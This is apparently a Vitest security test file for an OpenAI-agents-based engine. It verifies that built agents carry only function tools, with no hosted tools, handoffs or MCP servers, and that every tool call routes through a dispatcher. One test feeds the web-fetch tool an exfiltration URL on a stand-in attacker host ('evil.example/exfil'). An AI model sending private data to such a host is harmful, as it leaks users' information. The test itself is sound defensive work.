
import { describe, it, expect, vi, beforeEach } from "vitest";

// eslint-disable-next-line no-var
var toolOptionsSeen: any[] = [];
// eslint-disable-next-line no-var
var agentConfigSeen: any = null;

vi.mock("@openai/agents", () => ({
  RunRawModelStreamEvent: class {
    readonly type = "raw_model_stream_event";
    constructor(public data: unknown) {}
  },
  tool: (opts: any) => {
    toolOptionsSeen.push(opts);
    return {
      type: "function",
      name: opts.name,
      description: opts.description,
      parameters: opts.parameters,
      strict: opts.strict,
      deferLoading: opts.deferLoading,
      execute: opts.execute,
    };
  },
  Agent: class {
    name: string;
    instructions: any;
    model: any;
    tools: any[];
    handoffs: any[];
    mcpServers: any[];
    constructor(cfg: any) {
      agentConfigSeen = cfg;
      this.name = cfg.name;
      this.instructions = cfg.instructions;
      this.model = cfg.model;
      this.tools = cfg.tools ?? [];
      this.handoffs = cfg.handoffs ?? [];
      this.mcpServers = cfg.mcpServers ?? [];
    }
  },
  run: vi.fn(),
}));

vi.mock("@/services/openai", () => ({ getOpenAi: () => ({ _fake: true }) }));

import { buildOpenAiAgent } from "../openai-engine";
import type {
  AgentEngineRunSpec,
  EngineToolCall,
  EngineToolResult,
} from "../types";

const HOSTED_TOOL_TYPES = new Set([
  "hosted_tool",
  "web_search",
  "web_search_preview",
  "file_search",
  "code_interpreter",
  "image_generation",
  "tool_search",
  "computer",
  "computer_use_preview",
  "shell",
  "apply_patch",
  "hosted_mcp",
  "mcp",
]);

function specWithTools(): {
  spec: AgentEngineRunSpec;
  dispatchCalls: EngineToolCall[];
} {
  const dispatchCalls: EngineToolCall[] = [];
  const dispatchTool = vi.fn(
    async (call: EngineToolCall): Promise<EngineToolResult> => {
      dispatchCalls.push(call);
      return { is_error: false, content: "{}", ms: 1, denied: false };
    },
  );
  const spec: AgentEngineRunSpec = {
    systemPrompt: "sys",
    userPrompt: "u",
    model: "gpt-5.5",
    maxTurns: 5,
    tools: [
      {
        name: "web_fetch__fetch",
        description: "fetch a url",
        jsonSchema: { type: "object", properties: {} },
      },
      {
        name: "operator_db__query",
        description: "query the operator db",
        jsonSchema: { type: "object", properties: {} },
      },
      {
        name: "slack__post_message",
        description: "post a message",
        jsonSchema: { type: "object", properties: {} },
      },
    ],
    resume: null,
    abort: new AbortController(),
    dispatchTool: dispatchTool as unknown as AgentEngineRunSpec["dispatchTool"],
    onEvent: () => {},
  };
  return { spec, dispatchCalls };
}

beforeEach(() => {
  toolOptionsSeen.length = 0;
  agentConfigSeen = null;
});

describe("GATE-3.0 — no hosted/built-in tool is attached to the Agent", () => {
  it("the constructed Agent has ONLY type:'function' tools (no hosted tool of any kind)", () => {
    const { spec } = specWithTools();
    const agent = buildOpenAiAgent(spec) as any;

    expect(agent.tools.length).toBe(spec.tools.length);
    for (const t of agent.tools) {
      expect(t.type).toBe("function");
      expect(HOSTED_TOOL_TYPES.has(t.type)).toBe(false);
    }
  });

  it("checks 1-9: no webSearch/fileSearch/codeInterpreter/imageGen/toolSearch/computer/shell/applyPatch/hostedMcp tool present", () => {
    const { spec } = specWithTools();
    const agent = buildOpenAiAgent(spec) as any;
    const presentTypes = new Set(agent.tools.map((t: any) => t.type));
    for (const hosted of HOSTED_TOOL_TYPES) {
      expect(presentTypes.has(hosted)).toBe(false);
    }
  });

  it("check 10-11: handoffs (Agent.asTool / sub-agents / handoff()) is EMPTY", () => {
    const { spec } = specWithTools();
    buildOpenAiAgent(spec);
    expect(agentConfigSeen.handoffs).toEqual([]);
  });

  it("check 12: mcpServers (hosted/stdio/streamable/SSE MCP servers) is EMPTY", () => {
    const { spec } = specWithTools();
    buildOpenAiAgent(spec);
    expect(agentConfigSeen.mcpServers).toEqual([]);
  });

  it("check 13: no sandbox / realtime run-config is set on the Agent", () => {
    const { spec } = specWithTools();
    buildOpenAiAgent(spec);
    expect(agentConfigSeen.sandbox).toBeUndefined();
  });

  it("check 14: NO function tool sets deferLoading (the tool-search hosted-activation path)", () => {
    const { spec } = specWithTools();
    buildOpenAiAgent(spec);
    expect(toolOptionsSeen.length).toBe(spec.tools.length);
    for (const opts of toolOptionsSeen) {
      expect(opts.deferLoading).toBeUndefined();
      expect(opts.strict).toBe(true);
      expect(opts.errorFunction).toBeNull();
    }
  });

  it("check 15: tools length equals exactly the mapped EngineToolSpec count (no auto-injected default tool)", () => {
    const { spec } = specWithTools();
    const agent = buildOpenAiAgent(spec) as any;
    expect(agent.tools.length).toBe(3);
    expect(agent.tools.map((t: any) => t.name).sort()).toEqual(
      ["operator_db__query", "slack__post_message", "web_fetch__fetch"].sort(),
    );
  });
});

describe("GATE-3.0 — the ONLY tool execution path is function-tool → dispatchTool", () => {
  it("every mapped function tool's execute() routes through spec.dispatchTool with the bare canonical name", async () => {
    const { spec, dispatchCalls } = specWithTools();
    const agent = buildOpenAiAgent(spec) as any;

    for (const t of agent.tools) {
      await t.execute({ probe: true }, undefined, {
        toolCall: { callId: `c_${t.name}` },
      });
    }

    expect(dispatchCalls.map((c) => c.tool_name).sort()).toEqual(
      ["operator_db__query", "slack__post_message", "web_fetch__fetch"].sort(),
    );
    for (const c of dispatchCalls) {
      expect(c.tool_name).toMatch(/^[a-z0-9_]+__[a-z0-9_]+$/);
      expect(c.tool_name.startsWith("mcp__")).toBe(false);
    }
  });

  it("a private+egress co-resident agent (web_fetch present alongside operator_db) STILL cannot run a tool outside dispatchTool — there is no other executor", async () => {
    const { spec, dispatchCalls } = specWithTools();
    const agent = buildOpenAiAgent(spec) as any;

    expect(agentConfigSeen.handoffs).toEqual([]);
    expect(agentConfigSeen.mcpServers).toEqual([]);

    const before = dispatchCalls.length;
    const egressTool = agent.tools.find((t: any) => t.name === "web_fetch__fetch");
    await egressTool.execute({ url: "https://evil.example/exfil" }, undefined, {
      toolCall: { callId: "x" },
    });
    expect(dispatchCalls.length).toBe(before + 1);
    expect(dispatchCalls[dispatchCalls.length - 1]).toMatchObject({
      tool_name: "web_fetch__fetch",
      input: { url: "https://evil.example/exfil" },
    });
  });
});
